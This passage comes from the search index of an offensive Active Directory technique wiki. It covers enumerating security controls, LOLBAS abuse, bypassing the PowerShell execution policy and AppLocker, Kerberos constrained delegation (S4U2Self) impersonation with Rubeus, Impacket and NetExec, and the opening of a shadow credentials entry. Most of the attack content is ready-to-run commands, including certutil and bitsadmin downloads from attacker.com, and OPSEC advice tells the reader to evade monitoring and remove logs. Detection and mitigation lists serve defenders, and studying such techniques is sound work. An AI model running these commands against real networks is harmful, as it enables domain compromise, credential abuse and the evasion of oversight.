privileges\nGet-DomainUser -AdminCount | Select-Object SamAccountName, DistinguishedName\n\n# Find domain controllers and their security settings\nGet-DomainController | Select-Object Name, OSVersion, IPAddress\n</code></pre>","tags":["#type/technique","#tactic/TA0007","#technique/T1082","#stage/reconnaissance","#os/windows","#tool/seatbelt","#tool/sharpup","#tool/lolbas","#tool/powerview","#stage/initial-access"]},{"location":"Active%20Directory/flat/security_controls_enumeration/#domain-computer-security-assessment","title":"Domain Computer Security Assessment","text":"<pre><code># Find computers with constrained delegation (potential lateral movement targets)\nGet-DomainComputer -TrustedToAuth | Select-Object -Property DnsHostName, msds-allowedtodelegateto\n\n# Find computers with unconstrained delegation\nGet-DomainComputer -Unconstrained | Select-Object -Property DnsHostName\n\n# Find all domain computers with operating system information\nGet-DomainComputer -Properties DnsHostName, OperatingSystem, OperatingSystemVersion, LastLogonDate |\n    Sort-Object -Property OperatingSystem | Format-Table\n\n# Find servers with specific roles\nGet-DomainComputer -Properties DnsHostName, msDS-RevealedUsers, servicePrincipalName |\n    Where-Object {$_.servicePrincipalName -match \"SQL|MSSQL\"}\n</code></pre>","tags":["#type/technique","#tactic/TA0007","#technique/T1082","#stage/reconnaissance","#os/windows","#tool/seatbelt","#tool/sharpup","#tool/lolbas","#tool/powerview","#stage/initial-access"]},{"location":"Active%20Directory/flat/security_controls_enumeration/#application-control-applocker","title":"Application Control &amp; AppLocker","text":"<pre><code># Check AppLocker policy\nGet-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections\n\n# Check Software Restriction Policies\nReg Query \"HKLM\\Software\\Policies\\Microsoft\\Windows\\Safer\"\n\n# Check Device Guard / Windows Defender Application Control settings\nGet-CimInstance -ClassName Win32_DeviceGuard -Namespace root\\Microsoft\\Windows\\DeviceGuard\n</code></pre>","tags":["#type/technique","#tactic/TA0007","#technique/T1082","#stage/reconnaissance","#os/windows","#tool/seatbelt","#tool/sharpup","#tool/lolbas","#tool/powerview","#stage/initial-access"]},{"location":"Active%20Directory/flat/security_controls_enumeration/#laps-local-administrator-password-solution","title":"LAPS (Local Administrator Password Solution)","text":"<pre><code># Check if LAPS is installed\nGet-ChildItem 'C:\\Program Files\\LAPS\\CSE\\Admpwd.dll'\n\n# Check LAPS GPO settings (requires admin rights)\nReg Query \"HKLM\\Software\\Policies\\Microsoft Services\\AdmPwd\"\n</code></pre>","tags":["#type/technique","#tactic/TA0007","#technique/T1082","#stage/reconnaissance","#os/windows","#tool/seatbelt","#tool/sharpup","#tool/lolbas","#tool/powerview","#stage/initial-access"]},{"location":"Active%20Directory/flat/security_controls_enumeration/#windows-event-logging","title":"Windows Event Logging","text":"<pre><code># Check audit policy settings\nauditpol /get /category:*\n\n# Check Windows Event Forwarding settings\nwevtutil gl forwardedEvents\n\n# Check log sizes and retention policy\nwevtutil gl Security\nwevtutil gl System\nwevtutil gl Application\n</code></pre>","tags":["#type/technique","#tactic/TA0007","#technique/T1082","#stage/reconnaissance","#os/windows","#tool/seatbelt","#tool/sharpup","#tool/lolbas","#tool/powerview","#stage/initial-access"]},{"location":"Active%20Directory/flat/security_controls_enumeration/#tool-based-enumeration-techniques","title":"Tool-Based Enumeration Techniques","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1082","#stage/reconnaissance","#os/windows","#tool/seatbelt","#tool/sharpup","#tool/lolbas","#tool/powerview","#stage/initial-access"]},{"location":"Active%20Directory/flat/security_controls_enumeration/#seatbelt","title":"Seatbelt","text":"<p>Seatbelt is a C# project that performs comprehensive security checks from both offensive and defensive perspectives.</p> <pre><code># Run all checks\nSeatbelt.exe -group=all -outputfile=\"C:\\Temp\\seatbelt_all.txt\"\n\n# Run system-related checks\nSeatbelt.exe -group=system -outputfile=\"C:\\Temp\\seatbelt_system.txt\"\n\n# Run security-specific checks\nSeatbelt.exe -group=security -outputfile=\"C:\\Temp\\seatbelt_security.txt\"\n\n# Run antivirus checks only\nSeatbelt.exe AntiVirus\n\n# Check AppLocker configuration\nSeatbelt.exe AppLocker\n</code></pre>","tags":["#type/technique","#tactic/TA0007","#technique/T1082","#stage/reconnaissance","#os/windows","#tool/seatbelt","#tool/sharpup","#tool/lolbas","#tool/powerview","#stage/initial-access"]},{"location":"Active%20Directory/flat/security_controls_enumeration/#sharpup","title":"SharpUp","text":"<p>SharpUp helps identify common Windows privilege escalation vectors and security misconfigurations.</p> <pre><code># Run all checks\nSharpUp.exe\n\n# Run specific audits\nSharpUp.exe audit\n\n# Check for specific issues\nSharpUp.exe audit AlwaysInstallElevated\nSharpUp.exe audit ModifiableServices\n</code></pre>","tags":["#type/technique","#tactic/TA0007","#technique/T1082","#stage/reconnaissance","#os/windows","#tool/seatbelt","#tool/sharpup","#tool/lolbas","#tool/powerview","#stage/initial-access"]},{"location":"Active%20Directory/flat/security_controls_enumeration/#lolbas-living-off-the-land-binaries-and-scripts","title":"LOLBAS - Living Off The Land Binaries and Scripts","text":"<p>When traditional enumeration methods are blocked, LOLBAS (Living Off The Land Binaries and Scripts) can be used. These are Microsoft-signed binaries that can be used for alternative purposes.</p> <pre><code># Use certutil to download files\ncertutil.exe -urlcache -split -f \"http://attacker.com/file.exe\" file.exe\n\n# Use bitsadmin to download files\nbitsadmin /transfer myJob /download /priority high http://attacker.com/file.exe c:\\data\\file.exe\n\n# Use msbuild to execute code\nmsbuild.exe project.xml\n\n# Use rundll32 to execute code\nrundll32.exe advpack.dll,LaunchINFSection file.inf,DefaultInstall_SingleUser,1,\n</code></pre>","tags":["#type/technique","#tactic/TA0007","#technique/T1082","#stage/reconnaissance","#os/windows","#tool/seatbelt","#tool/sharpup","#tool/lolbas","#tool/powerview","#stage/initial-access"]},{"location":"Active%20Directory/flat/security_controls_enumeration/#linux-security-control-enumeration","title":"Linux Security Control Enumeration","text":"<pre><code># Check for antivirus installations\nps aux | grep -i \"virus\\|protect\\|defend\\|security\\|clamav\\|mcafee\\|symantec\"\n\n# Check loaded security modules\nlsmod | grep -i \"security\\|selinux\\|apparmor\\|audit\"\n\n# Check installed security packages\ndpkg -l | grep -i \"security\\|firewall\\|antivirus\\|protect\\|defend\"\n\n# Check SELinux status\ngetenforce\nsestatus\n\n# Check AppArmor status\naa-status\n\n# Check firewall rules\niptables -L\nufw status\n\n# Check audit rules\nauditctl -l\n\n# Check running security services\nsystemctl list-units --type=service | grep -i \"security\\|firewall\\|antivirus\\|protect\\|defend\"\n</code></pre>","tags":["#type/technique","#tactic/TA0007","#technique/T1082","#stage/reconnaissance","#os/windows","#tool/seatbelt","#tool/sharpup","#tool/lolbas","#tool/powerview","#stage/initial-access"]},{"location":"Active%20Directory/flat/security_controls_enumeration/#bypassing-security-controls","title":"Bypassing Security Controls","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1082","#stage/reconnaissance","#os/windows","#tool/seatbelt","#tool/sharpup","#tool/lolbas","#tool/powerview","#stage/initial-access"]},{"location":"Active%20Directory/flat/security_controls_enumeration/#powershell-execution-policy-bypass","title":"PowerShell Execution Policy Bypass","text":"<pre><code># Bypass execution policy for current process\nSet-ExecutionPolicy Bypass -Scope Process\n\n# Inline bypass with command\npowershell -ExecutionPolicy Bypass -File script.ps1\n\n# Use PowerShell v2 (if available) which might have fewer protections\npowershell.exe -version 2\n</code></pre>","tags":["#type/technique","#tactic/TA0007","#technique/T1082","#stage/reconnaissance","#os/windows","#tool/seatbelt","#tool/sharpup","#tool/lolbas","#tool/powerview","#stage/initial-access"]},{"location":"Active%20Directory/flat/security_controls_enumeration/#applocker-bypass-using-lolbas","title":"AppLocker Bypass Using LOLBAS","text":"<p>Using trusted utilities that exist in allowed paths (C:\\Windows and C:\\Program Files):</p> <pre><code># Example using MSBuild to execute C# code\n# First create an XML file with C# code (example: project.xml)\n\n# Then execute:\nmsbuild.exe project.xml\n</code></pre>","tags":["#type/technique","#tactic/TA0007","#technique/T1082","#stage/reconnaissance","#os/windows","#tool/seatbelt","#tool/sharpup","#tool/lolbas","#tool/powerview","#stage/initial-access"]},{"location":"Active%20Directory/flat/security_controls_enumeration/#alternative-powershell-paths","title":"Alternative PowerShell Paths","text":"<p>Many organizations block PowerShell.exe but forget about alternative PowerShell executables:</p> <pre><code># PowerShell in SysWOW64\n%SystemRoot%\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe\n\n# PowerShell ISE\nPowerShell_ISE.exe\n\n# PowerShell from .NET\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U script.ps1\n</code></pre>","tags":["#type/technique","#tactic/TA0007","#technique/T1082","#stage/reconnaissance","#os/windows","#tool/seatbelt","#tool/sharpup","#tool/lolbas","#tool/powerview","#stage/initial-access"]},{"location":"Active%20Directory/flat/security_controls_enumeration/#common-security-controls-to-identify","title":"Common Security Controls to Identify","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1082","#stage/reconnaissance","#os/windows","#tool/seatbelt","#tool/sharpup","#tool/lolbas","#tool/powerview","#stage/initial-access"]},{"location":"Active%20Directory/flat/security_controls_enumeration/#endpoint-protection","title":"Endpoint Protection","text":"<ul> <li>Antivirus/Antimalware: Windows Defender, Symantec, McAfee, etc.</li> <li>EDR Solutions: CrowdStrike, Carbon Black, SentinelOne, etc.</li> <li>Host-based Firewalls: Windows Firewall, iptables</li> <li>Host Intrusion Prevention Systems (HIPS)</li> </ul>","tags":["#type/technique","#tactic/TA0007","#technique/T1082","#stage/reconnaissance","#os/windows","#tool/seatbelt","#tool/sharpup","#tool/lolbas","#tool/powerview","#stage/initial-access"]},{"location":"Active%20Directory/flat/security_controls_enumeration/#application-controls","title":"Application Controls","text":"<ul> <li>Application Whitelisting: AppLocker, Software Restriction Policies</li> <li>PowerShell Security: ExecutionPolicy, AMSI, ScriptBlock Logging, Module Logging, Constrained Language Mode</li> <li>.NET CLR Versions (relevant for post-exploitation frameworks)</li> </ul>","tags":["#type/technique","#tactic/TA0007","#technique/T1082","#stage/reconnaissance","#os/windows","#tool/seatbelt","#tool/sharpup","#tool/lolbas","#tool/powerview","#stage/initial-access"]},{"location":"Active%20Directory/flat/security_controls_enumeration/#system-hardening","title":"System Hardening","text":"<ul> <li>User Account Control (UAC) settings</li> <li>Credential Guard/Device Guard status</li> <li>LAPS (Local Administrator Password Solution) implementation</li> <li>BitLocker or other disk encryption</li> <li>Secure Boot status</li> </ul>","tags":["#type/technique","#tactic/TA0007","#technique/T1082","#stage/reconnaissance","#os/windows","#tool/seatbelt","#tool/sharpup","#tool/lolbas","#tool/powerview","#stage/initial-access"]},{"location":"Active%20Directory/flat/security_controls_enumeration/#logging-monitoring","title":"Logging &amp; Monitoring","text":"<ul> <li>Windows Event Logging configurations</li> <li>Sysmon deployment and configuration</li> <li>Audit Policies (success/failure for various events)</li> <li>ETW (Event Tracing for Windows) configurations</li> </ul>","tags":["#type/technique","#tactic/TA0007","#technique/T1082","#stage/reconnaissance","#os/windows","#tool/seatbelt","#tool/sharpup","#tool/lolbas","#tool/powerview","#stage/initial-access"]},{"location":"Active%20Directory/flat/security_controls_enumeration/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1082","#stage/reconnaissance","#os/windows","#tool/seatbelt","#tool/sharpup","#tool/lolbas","#tool/powerview","#stage/initial-access"]},{"location":"Active%20Directory/flat/security_controls_enumeration/#detection","title":"Detection","text":"<ul> <li>Monitor for suspicious querying of registry keys related to security products</li> <li>Look for unusual WMI or PowerShell queries that enumerate security configurations</li> <li>Watch for enumeration of Windows services, especially security-related ones</li> <li>Monitor for tools like Seatbelt, SharpUp, and other security assessment utilities</li> <li>Alert on extensive command-line activity that queries system configurations</li> <li>Monitor for remote process enumeration through WMI/PowerShell remoting</li> <li>Watch for multiple registry queries from remote hosts</li> <li>Alert on unusual PowerView or WMI activities across multiple systems</li> </ul>","tags":["#type/technique","#tactic/TA0007","#technique/T1082","#stage/reconnaissance","#os/windows","#tool/seatbelt","#tool/sharpup","#tool/lolbas","#tool/powerview","#stage/initial-access"]},{"location":"Active%20Directory/flat/security_controls_enumeration/#mitigation","title":"Mitigation","text":"<ul> <li>Apply the principle of least privilege to limit what users can discover</li> <li>Configure proper AppLocker or Software Restriction Policies to block unauthorized tools</li> <li>Implement command line auditing to detect suspicious enumeration activities</li> <li>Regularly update and patch security software to protect against known evasion techniques</li> <li>Consider using deception technologies to detect enumeration attempts</li> <li>Enable PowerShell Script Block Logging and Module Logging</li> <li>Implement Just-In-Time administration for privileged access</li> <li>Use WDAC (Windows Defender Application Control) to limit which binaries can execute</li> <li>Restrict WMI access and PowerShell remoting to necessary users only</li> <li>Implement network segmentation to limit lateral movement</li> <li>Deploy honey accounts and systems to detect enumeration attempts</li> </ul>","tags":["#type/technique","#tactic/TA0007","#technique/T1082","#stage/reconnaissance","#os/windows","#tool/seatbelt","#tool/sharpup","#tool/lolbas","#tool/powerview","#stage/initial-access"]},{"location":"Active%20Directory/flat/security_controls_enumeration/#opsec-considerations","title":"OPSEC Considerations","text":"<p>When conducting security controls enumeration:</p> <ul> <li>Built-in commands (like <code>net</code>, <code>sc</code>, <code>wmic</code>) generate less noise than custom tools</li> <li>Some commands might be blocked or monitored (use alternatives like <code>net1</code> instead of <code>net</code>)</li> <li>Consider the timing of your enumeration activities to blend with normal user activity</li> <li>Run only necessary commands; exhaustive enumeration increases detection risk</li> <li>Be aware of command logging and audit trails</li> <li>PowerShell commands are likely monitored; consider using cmd.exe alternatives where possible</li> <li>For remote enumeration, limit the number of systems queried in a short timeframe</li> <li>WMI queries may be monitored; use targeted queries rather than broad sweeps</li> <li>Remove any logs or output files created during enumeration</li> <li>Use native WMI methods rather than PowerView when possible for a lower detection profile</li> </ul>","tags":["#type/technique","#tactic/TA0007","#technique/T1082","#stage/reconnaissance","#os/windows","#tool/seatbelt","#tool/sharpup","#tool/lolbas","#tool/powerview","#stage/initial-access"]},{"location":"Active%20Directory/flat/service_for_user_to_self/","title":"Service for user to self","text":"","tags":["#type/technique","#tactic/TA0008","#technique/T1558.002","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/service_for_user_to_self/#technique","title":"Technique","text":"<p>S4U2Self (Service for User to Self) is a Kerberos extension that allows a service to request a service ticket to itself on behalf of any user without requiring that user's password. When combined with S4U2Proxy (constrained delegation), an attacker can impersonate any user to access other services, enabling powerful lateral movement capabilities.</p> <p>This attack leverages Kerberos delegation, a feature designed to allow services to access resources on behalf of users. By abusing constrained delegation, attackers can impersonate high-value users (including administrators) to access target services like file shares, databases, or even domain controllers.</p>","tags":["#type/technique","#tactic/TA0008","#technique/T1558.002","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/service_for_user_to_self/#prerequisites","title":"Prerequisites","text":"<p>Access Level: Credentials (password or hash) for a service account that has constrained delegation configured.</p> <p>System State: The compromised service account must: - Have a registered Service Principal Name (SPN) - Be configured with constrained delegation to specific target SPNs via the <code>msDS-AllowedToDelegateTo</code> attribute - For protocol transition: be marked \"Trusted to authenticate for delegation\" (T2A4D)</p> <p>Information: Domain name, target SPN details (e.g., <code>cifs/targetserver.domain.local</code>), and Domain Controller IP address.</p>","tags":["#type/technique","#tactic/TA0008","#technique/T1558.002","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/service_for_user_to_self/#considerations","title":"Considerations","text":"<p>Impact</p> <p>This attack enables privilege escalation and lateral movement by allowing an attacker to impersonate any user (including domain administrators) to access specific services. It can lead to complete domain compromise if the delegation is configured to sensitive services or if misconfigured delegation permissions exist.</p> <p>OPSEC</p> <ul> <li> <p>Unusual Impersonation: S4U2Self/S4U2Proxy requests from service accounts impersonating high-value users (especially to services they don't normally access) may trigger alerts.</p> </li> <li> <p>Volume of Requests: Multiple delegation requests in a short timeframe can appear suspicious.</p> </li> <li> <p>Ticket Encryption: Modern environments typically use AES encryption. Forcing RC4 may generate alerts.</p> </li> <li> <p>Service Account Usage: Activity from service accounts outside normal operating hours or from unusual source machines may be flagged.</p> </li> </ul>","tags":["#type/technique","#tactic/TA0008","#technique/T1558.002","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/service_for_user_to_self/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0008","#technique/T1558.002","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/service_for_user_to_self/#identifying-vulnerable-accounts","title":"Identifying Vulnerable Accounts","text":"","tags":["#type/technique","#tactic/TA0008","#technique/T1558.002","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/service_for_user_to_self/#powerview","title":"PowerView","text":"<p>Find accounts with constrained delegation configured:</p> <pre><code># Import PowerView\nImport-Module .\\PowerView.ps1\n\n# Find user accounts with constrained delegation\nGet-DomainUser -TrustedToAuth | Select-Object samaccountname,msds-allowedtodelegateto\n\n# Find computer accounts with constrained delegation\nGet-DomainComputer -TrustedToAuth | Select-Object samaccountname,msds-allowedtodelegateto\n\n# Find accounts with unconstrained delegation (not directly for S4U2Self but useful to know)\nGet-DomainComputer -Unconstrained | Select-Object samaccountname\nGet-DomainUser -Unconstrained | Select-Object samaccountname\n</code></pre>","tags":["#type/technique","#tactic/TA0008","#technique/T1558.002","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/service_for_user_to_self/#attack-execution","title":"Attack Execution","text":"<ul> <li>Common Target SPNs:</li> <li><code>cifs/server.domain.local</code> - File shares</li> <li><code>http/server.domain.local</code> - Web services</li> <li><code>ldap/dc.domain.local</code> - Directory services (dangerous!)</li> <li><code>mssql/sqlserver.domain.local</code> - SQL Server</li> <li><code>host/server.domain.local</code> - Various Windows services</li> </ul>","tags":["#type/technique","#tactic/TA0008","#technique/T1558.002","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/service_for_user_to_self/#rubeus-windows","title":"Rubeus (Windows)","text":"<p>All-in-one approach (S4U2Self + S4U2Proxy):</p> <pre><code># 1) Create a sacrificial process to inject tickets\nRubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe /show\n# Note the process ID (PID) from the output\n\n# 2) Perform S4U2Self + S4U2Proxy attack and inject ticket\nRubeus.exe s4u /user:SERVICE_ACCOUNT /domain:domain.local /rc4:NTLM_HASH \\\n    /impersonateuser:TARGET_USER /msdsspn:cifs/server.domain.local /ptt /process:PID\n\n# 3) Verify ticket injection\nRubeus.exe triage /process:PID\n\n# 4) Access target resource as impersonated user\ndir \\\\server.domain.local\\c$\n</code></pre> <p>Step-by-step approach (with more control):</p> <pre><code># 1) Request TGT for service account\nRubeus.exe asktgt /user:SERVICE_ACCOUNT /domain:domain.local /rc4:NTLM_HASH /nowrap\n\n# 2) Perform S4U2Self to get service ticket\nRubeus.exe s4u /ticket:BASE64_TGT /impersonateuser:TARGET_USER /nowrap\n\n# 3) Perform S4U2Proxy to get service ticket to target SPN\nRubeus.exe s4u /ticket:BASE64_TGT /tgs:BASE64_TGS \\\n    /msdsspn:cifs/server.domain.local /ptt\n</code></pre> <p>Useful flags: - <code>/altservice:</code> - Specify alternate service to impersonate (service substitution attack) - <code>/nowrap</code> - Prevent wrapping of base64 output - <code>/ptt</code> - Pass the ticket into the current session - <code>/dc:</code> - Specify domain controller for the request</p>","tags":["#type/technique","#tactic/TA0008","#technique/T1558.002","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/service_for_user_to_self/#impacket-linux","title":"Impacket (Linux)","text":"<p>Basic S4U2Self + S4U2Proxy attack:</p> <pre><code># 1) Get TGT for service account\ngetTGT.py -dc-ip DC_IP domain.local/SERVICE_ACCOUNT:PASSWORD\n\n# 2) Perform S4U2Self + S4U2Proxy to get service ticket\ngetST.py -dc-ip DC_IP -spn cifs/server.domain.local \\\n    -impersonate TARGET_USER domain.local/SERVICE_ACCOUNT -k\n\n# 3) Export and use the ticket\nexport KRB5CCNAME=TARGET_USER.ccache\nimpacket-smbclient.py -k domain.local/TARGET_USER@server.domain.local\n# or\nimpacket-smbexec.py -k domain.local/TARGET_USER@server.domain.local\n</code></pre> <p>Using NTLM hash instead of password:</p> <pre><code># With hash instead of password\ngetTGT.py -dc-ip DC_IP -hashes :NTLM_HASH domain.local/SERVICE_ACCOUNT\ngetST.py -dc-ip DC_IP -spn cifs/server.domain.local \\\n    -impersonate TARGET_USER domain.local/SERVICE_ACCOUNT -k\n</code></pre>","tags":["#type/technique","#tactic/TA0008","#technique/T1558.002","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/service_for_user_to_self/#netexec-linux","title":"NetExec (Linux)","text":"<p>Enumerate accounts with constrained delegation:</p> <pre><code># Find user accounts with constrained delegation\nnxc ldap DC_IP -u USER -p PASSWORD --trusted-for-delegation -d domain.local\n\n# Find computer accounts with constrained delegation\nnxc ldap DC_IP -u USER -p PASSWORD --trusted-for-delegation --computersonly -d domain.local\n\n# Find all accounts with constrained delegation and their allowed SPNs\nnxc ldap DC_IP -u USER -p PASSWORD --search \"(&amp;(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=16777216))\" -d domain.local\n</code></pre> <p>Exploit constrained delegation to access target services:</p> <pre><code># 1. Request TGT for service account using NetExec\nnxc ldap DC_IP -u SERVICE_ACCOUNT -p PASSWORD --delegate --delegate-to cifs/server.domain.local --delegate-user TARGET_USER --kdcHost DC_IP -d domain.local\n\n# 2. Once you have the ticket, use it with impacket tools\nexport KRB5CCNAME=path/to/generated.ccache\nimpacket-smbexec.py -k -no-pass domain.local/TARGET_USER@server.domain.local\n</code></pre> <p>Combined scan and exploit:</p> <pre><code># Use the kdcHost parameter to specify the DC\nnxc smb DC_IP -u SERVICE_ACCOUNT -p PASSWORD --delegate-access --target server.domain.local -d domain.local\n\n# Using NTLM hash instead of password\nnxc smb DC_IP -u SERVICE_ACCOUNT -H NTLM_HASH --delegate-access --target server.domain.local -d domain.local\n</code></pre>","tags":["#type/technique","#tactic/TA0008","#technique/T1558.002","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/service_for_user_to_self/#delegations-tool-linuxwindows","title":"Delegations Tool (Linux/Windows)","text":"<p>The Delegations tool provides specialized capabilities for working with S4U2Self and other delegation types.</p> <p>Find accounts with constrained delegation:</p> <pre><code># Find all constrained delegations in the domain\n./Delegations find constrained --dc-ip DC_IP -d domain.local -u USER -p PASSWORD\n\n# Find delegations with protocol transition\n./Delegations find constrained --dc-ip DC_IP -d domain.local -u USER -p PASSWORD --with-protocol-transition\n\n# Check a specific account\n./Delegations find constrained --distinguished-name \"CN=SERVICE_ACCOUNT,CN=Users,DC=domain,DC=local\" \\\n    --dc-ip DC_IP -d domain.local -u USER -p PASSWORD\n</code></pre> <p>Add constrained delegation (requires admin rights):</p> <pre><code># Add constrained delegation to a service account\n./Delegations add constrained --distinguished-name \"CN=SERVICE_ACCOUNT,CN=Users,DC=domain,DC=local\" \\\n    --dc-ip DC_IP -d domain.local -u ADMIN -p PASSWORD \\\n    --allowed-to-delegate-to \"cifs/server.domain.local\"\n\n# Add with protocol transition (enables S4U2Self without Kerberos authentication)\n./Delegations add constrained --distinguished-name \"CN=SERVICE_ACCOUNT,CN=Users,DC=domain,DC=local\" \\\n    --dc-ip DC_IP -d domain.local -u ADMIN -p PASSWORD \\\n    --allowed-to-delegate-to \"cifs/server.domain.local\" --with-protocol-transition\n</code></pre> <p>Remove or modify delegations:</p> <pre><code># Remove specific delegation permission\n./Delegations remove constrained --distinguished-name \"CN=SERVICE_ACCOUNT,CN=Users,DC=domain,DC=local\" \\\n    --dc-ip DC_IP -d domain.local -u ADMIN -p PASSWORD \\\n    --allowed-to-delegate-to \"cifs/server.domain.local\"\n\n# Clear all constrained delegations\n./Delegations clear constrained --distinguished-name \"CN=SERVICE_ACCOUNT,CN=Users,DC=domain,DC=local\" \\\n    --dc-ip DC_IP -d domain.local -u ADMIN -p PASSWORD\n\n# Add/remove protocol transition separately\n./Delegations add protocoltransition --distinguished-name \"CN=SERVICE_ACCOUNT,CN=Users,DC=domain,DC=local\" \\\n    --dc-ip DC_IP -d domain.local -u ADMIN -p PASSWORD\n</code></pre>","tags":["#type/technique","#tactic/TA0008","#technique/T1558.002","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/service_for_user_to_self/#cleanup-considerations","title":"Cleanup Considerations","text":"<ul> <li>Remove injected Kerberos tickets from memory when done</li> <li>Clean up any created files (ticket caches, etc.)</li> </ul>","tags":["#type/technique","#tactic/TA0008","#technique/T1558.002","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/service_for_user_to_self/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0008","#technique/T1558.002","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/service_for_user_to_self/#detection","title":"Detection","text":"<ul> <li>Monitor Event ID 4769 (TGS Request) for service accounts requesting tickets for privileged users</li> <li>Look for S4U2Self/S4U2Proxy usage patterns that deviate from baseline</li> <li>Check for impersonation of sensitive accounts via delegation</li> <li>Monitor for abnormal resource access by service accounts</li> </ul>","tags":["#type/technique","#tactic/TA0008","#technique/T1558.002","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/service_for_user_to_self/#mitigation","title":"Mitigation","text":"<ul> <li>Mark sensitive accounts with \"Account is sensitive and cannot be delegated\"</li> <li>Use Resource-Based Constrained Delegation (RBCD) instead of traditional constrained delegation</li> <li>Audit and limit delegation configurations</li> <li>Implement Just-In-Time (JIT) administration</li> <li>Use Protected Users security group for privileged accounts</li> <li>Regularly audit and rotate service account credentials</li> </ul>","tags":["#type/technique","#tactic/TA0008","#technique/T1558.002","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/service_for_user_to_self/#technical-notes","title":"Technical Notes","text":"<ul> <li> <p>S4U2Self vs S4U2Proxy: S4U2Self gets a ticket to itself for any user; S4U2Proxy uses that ticket to request access to other configured services. Both are needed for complete delegation attacks.</p> </li> <li> <p>Protocol Transition: This allows services to accept any authentication type (not just Kerberos) and then obtain Kerberos tickets on behalf of users. Requires T2A4D flag (UserAccountControl 0x1000000).</p> </li> </ul>","tags":["#type/technique","#tactic/TA0008","#technique/T1558.002","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/netexec","#tool/delegations"]},{"location":"Active%20Directory/flat/shadow_credentials/","title":"Shadow credentials","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1558001","#stage/credential-access","#stage/privilege-escalation","#os/windows","#tool/pywhisker","#tool/whisker","#tool/certipy","#tool/rubeus"]},{"location":"Active%20Directory/flat/shadow_credentials/#technique","title":"Technique","text":"<p>The Shadow Credentials attack abuses Active Directory's Key Trust feature (introduced in Windows Server 2016) to enable authentication using X.509 certificates via PKINIT (Public Key Cryptography for Initial Authentication in Kerberos). An attacker with write permissions to a target object can modify the <code>msDS-KeyCredentialLink</code> attribute, adding a rogue key pair that enables authentication as that account.</p> <p>Unlike traditional NTLM or Kerberos password-based authentication, this technique enables an attacker to authenticate as the target without ever needing to know or crack the account's password. The attacker creates a certificate, binds it to the target via the <code>msDS-KeyCredentialLink</code> attribute, and then uses the certificate to request a TGT (Ticket Granting Ticket) through PKINIT, effectively impersonating the target account.</p>","tags":["#type/technique","#tactic/TA0006","#technique/T1558001","#stage/credential-access","#stage/privilege-escalation","#os/windows","#tool/pywhisker","#tool/whisker","#tool/certipy","#tool/rubeus"]},{"location":"Active%20Directory/flat/shadow_credentials/#prerequisites","title":"Prerequisites","text":"<p>Access Level:  - Write permissions to the target object's <code>msDS-KeyCredentialLink</code> attribute - Common scenarios include:   - GenericAll   - GenericWrite   - WriteDacl   - WriteProperty   - WriteOwner   - AllExtendedRights</p> <p>System State: - Target domain must be at least Windows Server 2016 domain functional level - Domain controllers must support PKINIT - Target account must not be a member of the \"Protected Users\" group</p> <p>Information:  - Valid domain credentials with the required write permissions to the 